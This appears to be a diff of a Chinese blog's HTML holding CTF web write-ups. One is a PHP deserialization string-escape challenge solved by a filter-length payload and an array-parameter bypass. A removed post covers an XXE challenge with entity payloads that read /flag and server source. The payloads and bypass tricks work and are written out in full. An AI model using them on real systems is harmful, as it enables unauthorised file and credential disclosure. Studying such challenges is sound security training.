__class__;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql</span> &#123;</span></span><br><span class="line">	<span class="keyword">private</span> $link = null;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> function <span class="title">connect</span><span class="params">($config)</span> </span>&#123;</span><br><span class="line">		$<span class="keyword">this</span>-&gt;link = mysql_connect(</span><br><span class="line">			$config[&#x27;hostname&#x27;],</span><br><span class="line">			$config[&#x27;username&#x27;], </span><br><span class="line">			$config[&#x27;password&#x27;]</span><br><span class="line">		);</span><br><span class="line">		mysql_select_db($config[&#x27;database&#x27;]);</span><br><span class="line">		mysql_query(<span class="string">&quot;SET sql_mode=&#x27;strict_all_tables&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> $<span class="keyword">this</span>-&gt;link;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> function <span class="title">select</span><span class="params">($table, $where, $ret = <span class="string">&#x27;*&#x27;</span>)</span> </span>&#123;</span><br><span class="line">		$sql = <span class="string">&quot;SELECT $ret FROM $table WHERE $where&quot;</span>;</span><br><span class="line">		$result = mysql_query($sql, $<span class="keyword">this</span>-&gt;link);</span><br><span class="line">		<span class="keyword">return</span> mysql_fetch_object($result);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> function <span class="title">insert</span><span class="params">($table, $key_list, $value_list)</span> </span>&#123;</span><br><span class="line">		$key = implode(<span class="string">&#x27;,&#x27;</span>, $key_list);</span><br><span class="line">		$value = &#x27;\&#x27;&#x27; . implode(&#x27;\&#x27;,\&#x27;&#x27;, $value_list) . &#x27;\&#x27;&#x27;; </span><br><span class="line">		$sql = <span class="string">&quot;INSERT INTO $table ($key) VALUES ($value)&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> mysql_query($sql);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> function <span class="title">update</span><span class="params">($table, $key, $value, $where)</span> </span>&#123;</span><br><span class="line">		$sql = <span class="string">&quot;UPDATE $table SET $key = &#x27;$value&#x27; WHERE $where&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> mysql_query($sql);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> function <span class="title">filter</span><span class="params">($<span class="built_in">string</span>)</span> </span>&#123;</span><br><span class="line">		$escape = array(&#x27;\&#x27;&#x27;, &#x27;\\\\&#x27;);</span><br><span class="line">		$escape = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $escape) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">		$<span class="built_in">string</span> = preg_replace($escape, <span class="string">&#x27;_&#x27;</span>, $<span class="built_in">string</span>);</span><br><span class="line"></span><br><span class="line">		$safe = array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;);</span><br><span class="line">		$safe = &#x27;/&#x27; . implode(&#x27;|&#x27;, $safe) . &#x27;/i&#x27;;</span><br><span class="line">		return preg_replace($safe, &#x27;hacker&#x27;, $string);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> function __tostring() &#123;</span><br><span class="line">		<span class="keyword">return</span> __class__;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">session_start();</span><br><span class="line">$user = <span class="keyword">new</span> user();</span><br><span class="line">$user-&gt;connect($config);</span><br></pre></td></tr></table></figure>
+
+
+<p>直接登录，<br><img src="https://img-blog.csdnimg.cn/20210513182430790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>在<code>www.zip</code>中有<code>register.php</code></p>
+<p><img src="https://img-blog.csdnimg.cn/20210513182650354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>找到注册界面，注册</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">123</span></span><br><span class="line"><span class="number">123</span></span><br></pre></td></tr></table></figure>
+<p>注册成功<br><img src="https://img-blog.csdnimg.cn/20210513182731789.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>按照提示跳转到登录页面，登录<br><img src="https://img-blog.csdnimg.cn/20210513182807824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>config.php 发现 flag 相关<br>profile.php 发现 file_get_contents()函数</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">profile = unserialize($profile);</span><br><span class="line">		$phone = $profile[&#x27;phone&#x27;];</span><br><span class="line">		$email = $profile[&#x27;email&#x27;];</span><br><span class="line">		$nickname = $profile[&#x27;nickname&#x27;];</span><br><span class="line">		$photo = base64_encode(file_get_contents($profile[&#x27;photo&#x27;]));</span><br></pre></td></tr></table></figure>
+
+<p>让 $profile[‘photo’]的值为“config.php”，这这样就可以得到flag了。</p>
+<p>利用反序列化漏洞，在nickname里加上</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;;&#125;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
+<p>update.php 中，</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) || strlen($_POST[&#x27;nickname&#x27;]) &gt; 10)</span><br><span class="line">			die(&#x27;Invalid nickname&#x27;);</span><br></pre></td></tr></table></figure>
+<p>用于控制nickname的值，但可以传递数组，传递后，会先把序列化的值先过滤</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> function <span class="title">update_profile</span><span class="params">($username, $new_profile)</span> </span>&#123;</span><br><span class="line">		$username = parent::filter($username);</span><br><span class="line">		$new_profile = parent::filter($new_profile);</span><br><span class="line"></span><br><span class="line">		$where = <span class="string">&quot;username = &#x27;$username&#x27;&quot;</span>;</span><br><span class="line">		return parent::update($this-&gt;table, &#x27;profile&#x27;, $new_profile, $where);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> function <span class="title">filter</span><span class="params">($<span class="built_in">string</span>)</span> </span>&#123;</span><br><span class="line">		$escape = array(&#x27;\&#x27;&#x27;, &#x27;\\\\&#x27;);</span><br><span class="line">		$escape = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $escape) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">		$<span class="built_in">string</span> = preg_replace($escape, <span class="string">&#x27;_&#x27;</span>, $<span class="built_in">string</span>);</span><br><span class="line"></span><br><span class="line">		$safe = array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;);</span><br><span class="line">		$safe = &#x27;/&#x27; . implode(&#x27;|&#x27;, $safe) . &#x27;/i&#x27;;</span><br><span class="line">		return preg_replace($safe, &#x27;hacker&#x27;, $string);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> function __tostring() &#123;</span><br><span class="line">		<span class="keyword">return</span> __class__;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再保存在数据中</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$user-&gt;update_profile($username, serialize($profile));</span><br></pre></td></tr></table></figure>
+<p>过滤时想让<code>&quot;;&#125;s:5:“photo”;s:10:“config.php</code>;”被拼接在反序列化字符串里，而不是被当做nickname的值。<br>因为<code>&quot;;&#125;s:5:“photo”;s:10:“config.php”;&#125;</code>是34个字符。<br>我们就传递34个where，在序列化后，存入数据库时，会把where变成hacker，长度加一。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;s:<span class="number">6</span>*<span class="number">34</span>:hacker...kacker<span class="string">&quot;;&#125;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;s:39:&quot;</span>upload/<span class="number">804f</span>743824c0451b2f60d81b63b6a900<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
+<p>因为本来6*34个字符的长度=34个where+“length(s:39:“upload/804f743824c0451b2f60d81b63b6a900”;})”，所以反序列化后， <code>$profile[‘nickname’]</code> 就等于config.php了。</p>
+<p>抓包<br><img src="https://img-blog.csdnimg.cn/20210513184736446.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>注意：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;nickname&quot;</span> →</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;nickname[]&quot;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="string">&quot;;&#125;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/2021051318500290.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Update Profile Success!&lt;a href=<span class="string">&quot;profile.php&quot;</span>&gt;Your Profile&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+<p>转到 <code>/profile.php</code> ，<br><img src="https://img-blog.csdnimg.cn/2021051318512291.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210513185205638.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$config[&#x27;hostname&#x27;] = &#x27;127.0.0.1&#x27;;</span><br><span class="line">$config[&#x27;username&#x27;] = &#x27;root&#x27;;</span><br><span class="line">$config[&#x27;password&#x27;] = &#x27;qwertyuiop&#x27;;</span><br><span class="line">$config[&#x27;database&#x27;] = &#x27;challenges&#x27;;</span><br><span class="line">$flag = &#x27;flag&#123;38718a0d-bd69-43ff-8926-bb4a90c06bf0&#125;&#x27;;</span><br></pre></td></tr></table></figure>
+
+<h2 id="tip"><a href="#tip" class="headerlink" title="tip"></a>tip</h2><h3 id="url传递数组"><a href="#url传递数组" class="headerlink" title="url传递数组"></a>url传递数组</h3><p>当我们要向服务器传递数组时，我们可以通过</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/index.php?a[]=hello&amp;a[]=world</span></span><br></pre></td></tr></table></figure>
+
+<p>来传递，这样，在后端，</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a = $_GET[<span class="string">&#x27;a&#x27;</span>];</span><br></pre></td></tr></table></figure>
+
+<p>就可以接收到 <code>$a[0]=“hello”, $a[1]=“world”。</code></p>
+<h3 id="数组的遍历"><a href="#数组的遍历" class="headerlink" title="数组的遍历"></a>数组的遍历</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">foreach (array_expression as $value)</span><br><span class="line"><span class="comment">//遍历给定的 array_expression 数组。每次循环中，当前单元的值被赋给 $value 并且数组内部的指针向前移一步（因此下一次循环中将会得到下一个单元）。</span></span><br><span class="line">foreach (array_expression as $key =&gt; $value)</span><br><span class="line"><span class="comment">//做同样的事，只除了当前单元的值赋给$value外，键名也会在每次循环中被赋给变量 $key。</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$arr = <span class="built_in">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line">foreach ($arr as &amp;$value) &#123;</span><br><span class="line">    $value = $value * <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">                $ <span class="function">arr is now <span class="title">array</span><span class="params">(<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">unset</span><span class="params">($value)</span></span>;  最后取消掉引用</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="built_in">array</span>(</span><br><span class="line">    <span class="string">&quot;one&quot;</span> =&gt; <span class="number">1</span>,</span><br><span class="line">    <span class="string">&quot;two&quot;</span> =&gt; <span class="number">2</span>,</span><br><span class="line">    <span class="string">&quot;three&quot;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">    <span class="string">&quot;seventeen&quot;</span> =&gt; <span class="number">17</span></span><br><span class="line">);</span><br><span class="line">foreach ($a as $k =&gt; $v) &#123;</span><br><span class="line">    echo <span class="string">&quot;\$a[$k] =&gt; $v.\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">输出 $a[one] =&gt; <span class="number">1.</span> $a[two] =&gt; <span class="number">2.</span> $a[three] =&gt; <span class="number">3.</span> $a[seventeen] =&gt; <span class="number">17.</span> </span><br></pre></td></tr></table></figure>
+
+<h3 id="数组绕过正则即相关"><a href="#数组绕过正则即相关" class="headerlink" title="数组绕过正则即相关"></a>数组绕过正则即相关</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">md5(Array()) = null</span><br><span class="line">sha1(Array()) = null</span><br><span class="line">ereg(pattern,Array()) =null</span><br><span class="line">preg_match(pattern,Array()) = <span class="literal">false</span></span><br><span class="line"><span class="built_in">strcmp</span>(Array(), “abc”) =null</span><br><span class="line">strpos(Array(),“abc”) = null</span><br><span class="line"><span class="built_in">strlen</span>(Array()) = null</span><br></pre></td></tr></table></figure>
+<h3 id="改变序列化长度，导致反序列化漏洞"><a href="#改变序列化长度，导致反序列化漏洞" class="headerlink" title="改变序列化长度，导致反序列化漏洞"></a>改变序列化长度，导致反序列化漏洞</h3><p>unserialize(str) 会忽略能够正常序列化的字符串后面的字符串。也是这到题最厉害的一点。像这样的一个字符串，我们可以可以不用反序列话，就能知道它反序列化后是什么，因为它是有规律的。<br>a:4:{s:5:“phone”;s:11:“11111111111”;s:5:“email”;s:11:“<a href="mailto:&#49;&#x61;&#x32;&#115;&#64;&#x71;&#x71;&#46;&#x63;&#x6f;&#x6d;">&#49;&#x61;&#x32;&#115;&#64;&#x71;&#x71;&#46;&#x63;&#x6f;&#x6d;</a>”;s:8:“nickname”;s:3:“123”;s:5:“photo”;s:39:“upload/f3b94e88bd1bd325af6f62828c8785dd”;}<br>a:4指的是由一个数组序列化而来，并且有4个值。如果是对象的话，好像是把a改成了O。然后就是一个键值名，一个变量值：<br>s:5:”phone”;第一个键值名，是string类型的，长度为五，s:11:”11111111111”;第一个变量值，string类型，长度为11.这就是它的规律。<br><strong>如果我们在这个序列化字符串的后面，再加上一些字符，后面的字符是不会被反序列化的。</strong></p>
+<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>序列化数组</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = array(&#x27;123&#x27;, &#x27;abc&#x27;, &#x27;4567&#x27;,&#x27;defg&#x27;);</span><br><span class="line">var_dump(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>输出</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">string</span>(<span class="number">64</span>) <span class="string">&quot;a:4:&#123;i:0;s:3:&quot;</span><span class="number">123</span><span class="string">&quot;;i:1;s:3:&quot;</span>abc<span class="string">&quot;;i:2;s:4:&quot;</span><span class="number">4567</span><span class="string">&quot;;i:3;s:4:&quot;</span>defg<span class="string">&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>反序列化该数据</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a =&#x27;a:4:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;4567&quot;;i:3;s:4:&quot;defg&quot;;&#125;&#x27;;</span><br><span class="line">var_dump(unserialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>输出</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">array</span>(<span class="number">4</span>) &#123; [<span class="number">0</span>]=&gt; <span class="built_in">string</span>(<span class="number">3</span>) <span class="string">&quot;123&quot;</span> [<span class="number">1</span>]=&gt; <span class="built_in">string</span>(<span class="number">3</span>) <span class="string">&quot;abc&quot;</span> [<span class="number">2</span>]=&gt; <span class="built_in">string</span>(<span class="number">4</span>) <span class="string">&quot;4567&quot;</span> [<span class="number">3</span>]=&gt; <span class="built_in">string</span>(<span class="number">4</span>) <span class="string">&quot;defg&quot;</span> &#125;</span><br></pre></td></tr></table></figure>
+<p>我们能修改序列化的数据，以达到读取任意文件操作、</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a =&#x27;a:4:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;4567&quot;;i:3;s:5:&quot;ccccc&quot;;&#125;i:3;s:4:&quot;defg&quot;;&#125;&#x27;;</span><br><span class="line">var_dump(unserialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>结果</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">array</span>(<span class="number">4</span>) &#123; [<span class="number">0</span>]=&gt; <span class="built_in">string</span>(<span class="number">3</span>) <span class="string">&quot;123&quot;</span> [<span class="number">1</span>]=&gt; <span class="built_in">string</span>(<span class="number">3</span>) <span class="string">&quot;abc&quot;</span> [<span class="number">2</span>]=&gt; <span class="built_in">string</span>(<span class="number">4</span>) <span class="string">&quot;4567&quot;</span> [<span class="number">3</span>]=&gt; <span class="built_in">string</span>(<span class="number">5</span>) <span class="string">&quot;ccccc&quot;</span> &#125;</span><br></pre></td></tr></table></figure>
+<p>恶意闭合添了数据，后面的数据被丢弃了，我们可以利用这样的方式来读取文件。</p>
+<p>用这样的方式，将原本的photo给丢弃，则需要在nickname的值后写入<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>。</p>
+<p>但nickname却在被序列化前，被strlen函数限制只能小于10长度。该函数可以用数组来进行绕过，只需要在提交前把nickname写成数组即可绕过。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/15/XSS-Lab%EF%BC%8811-12%EF%BC%89/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1886,183 +2110,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/20/20210320/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="花间一壶酒">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2021/03/20/20210320/" itemprop="url">（NCTF2019）True XML cookbook</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-03-20T22:17:45+08:00">
-                2021-03-20
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web/" itemprop="url" rel="index">
-                    <span itemprop="name">web</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h2><p><img src="https://img-blog.csdnimg.cn/20210321110313781.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>抓包<br><img src="https://img-blog.csdnimg.cn/20210321110341215.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: application/xml;charset=utf<span class="number">-8</span></span><br></pre></td></tr></table></figure>
-<p>发现是XXE漏洞。</p>
-<p>先拿XXE漏洞poc读/flag。</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span> ?&gt;</span><br><span class="line">&lt;!DOCTYPE hack [</span><br><span class="line">&lt;!ENTITY file SYSTEM  <span class="string">&quot;file:///flag&quot;</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">  &lt;username&gt;&amp;file;&lt;/username&gt;</span><br><span class="line">  &lt;password&gt;hack&lt;/password&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210321110527446.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>flag并不在这里，那读一下他的源码。</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span> ?&gt;</span><br><span class="line">&lt;!DOCTYPE hack [</span><br><span class="line">&lt;!ENTITY file SYSTEM  <span class="string">&quot;file:///var/www/html/doLogin.php&quot;</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">  &lt;username&gt;&amp;file;&lt;/username&gt;</span><br><span class="line">  &lt;password&gt;hack&lt;/password&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210321110716270.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>file协议读没用，换php协议读.</p>
